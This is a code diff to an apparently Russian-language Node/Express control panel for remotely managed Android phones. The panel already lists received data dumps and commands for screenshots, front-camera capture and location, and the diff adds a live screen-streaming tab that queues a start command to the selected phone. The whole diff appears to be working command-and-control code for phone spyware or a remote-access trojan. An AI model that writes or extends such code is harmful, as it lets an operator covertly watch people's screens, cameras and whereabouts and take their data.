@@ -381,6 +381,14 @@ function takeCommand(deviceId) {
   return cmd;
 }
 
+function queueCommand(deviceId, cmd) {
+  const cmds = readCmds();
+  if (!cmds[deviceId]) cmds[deviceId] = [];
+  cmds[deviceId].push({ cmd, ts: Date.now() });
+  writeCmds(cmds);
+  wakePollers(deviceId);
+}
+
 function wakePollers(deviceId) {
   const set = pollWaiters.get(deviceId);
   if (!set || set.size === 0) return;
@@ -391,6 +399,88 @@ function wakePollers(deviceId) {
     if (!w.res.headersSent) w.res.json({ ok: true, cmd: cmd || null });
   }
 }
+
+// ── экран в реальном времени (MJPEG) ──────────────────────────────────────
+const latestFrame = new Map();   // deviceId -> Buffer (jpeg)
+const frameClients = new Map();  // deviceId -> Set<res>
+const FRAME_STALE_MS = 10000;
+
+function broadcastFrame(deviceId, jpeg) {
+  const set = frameClients.get(deviceId);
+  if (!set) return;
+  for (const res of Array.from(set)) {
+    try {
+      res.write('--frame\r\n');
+      res.write('Content-Type: image/jpeg\r\n');
+      res.write('Content-Length: ' + jpeg.length + '\r\n\r\n');
+      res.write(jpeg);
+      res.write('\r\n');
+    } catch (e) {
+      set.delete(res);
+    }
+  }
+}
+
+app.post('/stream/frame', express.raw({ type: 'image/jpeg', limit: '12mb' }), (req, res) => {
+  const key = req.headers['x-key'] || req.query.key;
+  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });
+
+  const deviceId = req.headers['x-device-id'] || req.query.device || 'unknown';
+  const body = req.body;
+  if (!Buffer.isBuffer(body) || body.length === 0) return res.status(400).json({ ok: false, err: 'no frame' });
+
+  latestFrame.set(deviceId, { buf: body, ts: Date.now() });
+  broadcastFrame(deviceId, body);
+  res.json({ ok: true, size: body.length });
+});
+
+app.get('/stream/:device', (req, res) => {
+  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
+
+  const deviceId = req.params.device;
+  res.writeHead(200, {
+    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+    'Pragma': 'no-cache',
+    'Connection': 'keep-alive',
+    'X-Accel-Buffering': 'no'
+  });
+
+  if (!frameClients.has(deviceId)) frameClients.set(deviceId, new Set());
+  const set = frameClients.get(deviceId);
+  set.add(res);
+
+  const fresh = latestFrame.get(deviceId);
+  if (fresh && Date.now() - (latestFrame.get(deviceId + ':ts') || 0) < FRAME_STALE_MS) {
+    try {
+      res.write('--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ' + fresh.length + '\r\n\r\n');
+      res.write(fresh);
+      res.write('\r\n');
+    } catch (e) {}
+  }
+
+  const keep = setInterval(() => {
+    try { res.write(''); } catch (e) { cleanup(); }
+  }, 15000);
+
+  function cleanup() {
+    clearInterval(keep);
+    set.delete(res);
+    if (set.size === 0) frameClients.delete(deviceId);
+  }
+
+  req.on('close', cleanup);
+  res.on('close', cleanup);
+});
+
+app.post('/stream/stop', (req, res) => {
+  const key = req.query.key || (req.body && req.body.key);
+  if (key !== VIEW_KEY) return res.status(403).json({ ok: false });
+  const deviceId = req.query.device || (req.body && req.body.device);
+  if (deviceId) queueCommand(deviceId, 'streamstop');
+  res.json({ ok: true });
+});
+
 
 app.get('/cmd/send', (req, res) => {
   if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
@@ -444,6 +534,7 @@ const NAV = [
   { id: 'overview', label: 'Обзор' },
   { id: 'dumps', label: 'Дампы' },
   { id: 'control', label: 'Устройства' },
+  { id: 'screen', label: 'Экран' },
   { id: 'logs', label: 'Логи' },
   { id: 'uploadlog', label: 'Загрузки' },
   { id: 'settings', label: 'Настройки' }
@@ -453,6 +544,7 @@ const TITLES = {
   overview: 'Обзор',
   dumps: 'Дампы',
   control: 'Устройства',
+  screen: 'Экран',
   logs: 'Логи',
   uploadlog: 'Загрузки',
   settings: 'Настройки'
@@ -462,6 +554,7 @@ const SUBTITLES = {
   overview: 'Сводка по устройствам и активности',
   dumps: 'Архивы, принятые от устройств',
   control: 'Подключённые устройства и команды',
+  screen: 'Трансляция экрана устройства',
   logs: 'События синхронизации и результаты команд',
   uploadlog: 'История загрузок по чанкам',
   settings: 'Внешний вид и поведение панели'
@@ -713,6 +806,7 @@ app.get('/', (req, res) => {
           <a class="cmd-card" href="/cmd/send?${q}&cmd=screenshot">${icon('camera')}<span>Скриншот</span><small>screenshot</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=frontcam">${icon('user')}<span>Фронталка</span><small>frontcam</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=location">${icon('pin')}<span>Гео</span><small>location</small></a>
+          <a class="cmd-card" href="/?key=${k}&tab=screen&device=${encodeURIComponent(selectedDevice)}">${icon('control')}<span>Экран</span><small>live view</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=sound">${icon('bolt')}<span>Звук</span><small>sound</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=stopsound">${icon('check')}<span>Стоп звук</span><small>stopsound</small></a>
         </div>
@@ -812,6 +906,7 @@ app.get('/', (req, res) => {
     overview: null,
     dumps: files.length,
     control: deviceList.length,
+    screen: null,
     logs: logs.length,
     uploadlog: uploadLogs.length,
     settings: null
@@ -834,9 +929,57 @@ app.get('/', (req, res) => {
     tab === 'logs' ? `<a class="btn btn-ghost btn-danger" href="/clearlogs?key=${k}" onclick="return confirm('Удалить все логи?')">${icon('trash')}Очистить</a>` :
     tab === 'uploadlog' ? `<a class="btn btn-ghost btn-danger" href="/clearuploadlogs?key=${k}" onclick="return confirm('Удалить upload-логи?')">${icon('trash')}Очистить</a>` : '';
 
+  // ── screen ──
+  let screenHtml = '';
+  if (tab === 'screen') {
+    const dev = selectedDevice ? devices[selectedDevice] : null;
+    if (!dev) {
+      screenHtml = deviceList.length === 0
+        ? `<div class="empty">${icon('control', 'empty-ico')}<h3>Нет устройств</h3><p>Подключи телефон и обнови страницу</p></div>`
+        : `<div class="dev-grid">` + deviceList.map(d => `
+            <a class="dev-card" href="/?key=${k}&tab=screen&device=${encodeURIComponent(d.deviceId)}">
+              <div class="dev-top">
+                ${avatar(d.device)}
+                <div class="dev-name">
+                  <b>${esc(d.device)}</b>
+                  <small class="mono">${esc(d.deviceId)}</small>
+                </div>
+                <span class="dot ${online(d) ? 'is-on' : ''}"></span>
+              </div>
+              <div class="dev-meta">
+                <span>${esc(d.android)} · SDK ${esc(d.sdk)}</span>
+                <span class="mono">${ipOf(d.ip)}</span>
+              </div>
+              <div class="dev-foot">
+                <span class="chip">смотреть экран →</span>
+                <span class="faint">${S.relativeTime ? ago(d.lastSeen) : fmtTime(d.lastSeen)}</span>
+              </div>
+            </a>`).join('') + `</div>`;
+    } else {
+      queueCommand(selectedDevice, 'streamstart');
+      screenHtml = `
+        <a class="back" href="/?key=${k}&tab=screen">${icon('back')}Все устройства</a>
+        <section class="panel">
+          <header class="panel-head">
+            <h2>${esc(dev.device)} · экран</h2>
+            <div class="panel-actions">
+              <span class="pill is-ok">live</span>
+              <a class="btn btn-ghost btn-danger" href="/cmd/send?key=${k}&device=${encodeURIComponent(selectedDevice)}&cmd=streamstop">Стоп</a>
+            </div>
+          </header>
+          <div class="screen-wrap">
+            <img class="screen" data-stream="/stream/${encodeURIComponent(selectedDevice)}?key=${k}&t=${Date.now()}" alt="экран устройства"/>
+          </div>
+        </section>
+        <p class="screen-hint">Трансляция идёт, пока открыта эта страница. Закроешь вкладку — телефон остановится сам.</p>`;
+    }
+  }
+
   let body = '';
   if (tab === 'overview') {
     body = overviewHtml;
+  } else if (tab === 'screen') {
+    body = screenHtml;
   } else if (tab === 'settings') {
     body = settingsHtml;
   } else if (tab === 'control') {
@@ -1244,6 +1387,11 @@ td.right .btn+.btn{margin-left:6px}
 .pal-item:hover,.pal-item.is-sel{background:var(--hover)}
 .pal-hint{font-size:11px;color:var(--fg-3)}
 
+.panel-actions{display:flex;align-items:center;gap:8px}
+.screen-wrap{background:#000;display:flex;align-items:center;justify-content:center;min-height:320px;max-height:calc(100vh - 300px)}
+.screen{display:block;max-width:100%;max-height:calc(100vh - 300px);object-fit:contain;background:#000}
+.screen-hint{margin:12px 2px 0;font-size:11.5px;color:var(--fg-3)}
+
 /* ── density ── */
 .is-dense tbody td{padding:7px 12px}
 .is-dense thead th{padding:8px 12px}
@@ -1328,7 +1476,7 @@ body.t-crimson{
   .toolbar{flex-wrap:wrap}
 }
 </style></head>
-<body class="${bodyClass}" style="--fs:${S.fontSize}px"${S.autoRefresh ? ` data-autoref="${S.autoRefresh}"` : ''}${req.query.sent ? ' data-watch="3"' : ''}>
+<body class="${bodyClass}" style="--fs:${S.fontSize}px"${S.autoRefresh ? ` data-autoref="${S.autoRefresh}"` : ''}${req.query.sent ? ' data-watch="3"' : ''}${tab === 'screen' && selectedDevice ? ` data-screen="${esc(selectedDevice)}" data-key="${k}"` : ''}>
 <div class="shell">
   <aside class="rail">
     <div class="brand">
@@ -1377,6 +1525,29 @@ body.t-crimson{
       for (var i = 0; i < rows.length; i++) {
         rows[i].style.display = rows[i].textContent.toLowerCase().indexOf(q) > -1 ? '' : 'none';
       }
+    });
+  }
+
+  var live = document.querySelector('[data-stream]');
+  if (live) {
+    // поток MJPEG никогда не «завершается», поэтому ставим src после загрузки документа
+    setTimeout(function(){
+      live.src = live.getAttribute('data-stream');
+    }, 50);
+    live.addEventListener('error', function(){
+      setTimeout(function(){
+        live.src = live.getAttribute('data-stream') + '&r=' + Date.now();
+      }, 2000);
+    });
+  }
+
+  var scr = document.body.getAttribute('data-screen');
+  if (scr) {
+    var scrKey = document.body.getAttribute('data-key') || '';
+    window.addEventListener('pagehide', function(){
+      try {
+        navigator.sendBeacon('/stream/stop?key=' + encodeURIComponent(scrKey) + '&device=' + encodeURIComponent(scr));
+      } catch (e) {}
     });
   }
 
